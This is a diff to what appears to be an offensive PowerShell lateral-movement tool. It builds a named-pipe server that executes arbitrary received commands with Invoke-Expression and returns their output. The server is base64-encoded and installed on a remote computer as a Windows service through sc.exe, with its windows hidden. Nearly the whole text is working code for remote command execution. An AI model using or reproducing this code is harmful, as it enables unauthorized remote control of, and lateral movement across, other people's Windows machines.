@@ -1489,60 +1489,38 @@ catch {
 	}
 	
 	$ServerScript = @"
-`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
-
+`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
 `$pipeServer.WaitForConnection()
-
 `$sr = New-Object System.IO.StreamReader(`$pipeServer)
 `$sw = New-Object System.IO.StreamWriter(`$pipeServer)
-
 while (`$true) {
-
-	# Check if client is still connected. If not, break.
 	if (-not `$pipeServer.IsConnected) {
 		break
 	}
-
 	`$command = `$sr.ReadLine()
-	
-	`$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(4096, `$Host.UI.RawUI.BufferSize.Height)
-
-	if (`$command -eq "exit") {
-		`$sw.WriteLine("Exiting...")
-		`$sw.Flush()
-		break
-	} 
-	
+	if (`$command -eq "exit") {break} 
 	else {
 		try{
 			`$result = Invoke-Expression `$command | Out-String
-
 			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
-		} 
-		
-		catch {
+		} catch {
 			`$errorMessage = `$_.Exception.Message
 			`$sw.WriteLine(`$errorMessage)
 		}
-
-		`$sw.WriteLine("###END###")  # Delimiter indicating end of command result
+		`$sw.WriteLine("###END###")
 		`$sw.Flush()
 	}
 }
-
 `$pipeServer.Disconnect()
-`$sr.Close()
-`$sw.Close()
+`$pipeServer.Dispose()
 "@
 	
 	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
-	$FullCommand = "`$encstring = `"$B64ServerScript`"; `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
-	$b64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
-	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64command`""
+	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
 	$startarguments = "\\$ComputerName start $ServiceName"
 	
 	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-	Start-Sleep -Milliseconds 200
+	Start-Sleep -Milliseconds 2000
 	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
 	
 	# Get the current process ID
